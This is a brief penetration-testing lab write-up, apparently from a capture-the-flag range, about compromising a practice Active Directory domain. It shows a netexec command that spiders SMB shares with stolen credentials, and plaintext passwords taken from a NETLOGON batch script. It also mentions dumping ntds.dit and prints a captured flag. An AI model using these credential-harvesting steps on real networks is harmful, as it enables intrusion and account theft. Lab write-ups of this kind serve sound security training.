
# NMAP

# SMB

Used netexec spider module to download all accessible files at once:


```
netexec smb 10.0.2.100 -u 'hack-academy.local\kpatel' -p '100%Mary' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
```

This showed an interesting file named update-agents.bat in NETLOGON share:

```
└─$ cat update-agents.bat 
@echo off
REM DEPRECATED -- replaced by SCCM
REM Last updated: 2022-11-03
REM This script is no longer in use. Contact IT before running.

net use \\MGMT-SRV\agents$ /user:hack-academy\svc_update $!Doonite03
xcopy \\MGMT-SRV\agents$\*.msi C:\Temp\agents\ /Y /Q
net use \\MGMT-SRV\agents$ /delete
```

This suggests a password:

```
svc_update : $!Doonite03
```

From Client 2 I got the svc_admin password for DC01, able to dump ntds.dit and everything:

svc_admin user and password:

```
svc_admin : -Berlin-
```


This let me get the proof.txt on the DC01

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
Hacker_Blueprint{c4ca4238a0b923820dcc509a6f75849b}
```

==DONE==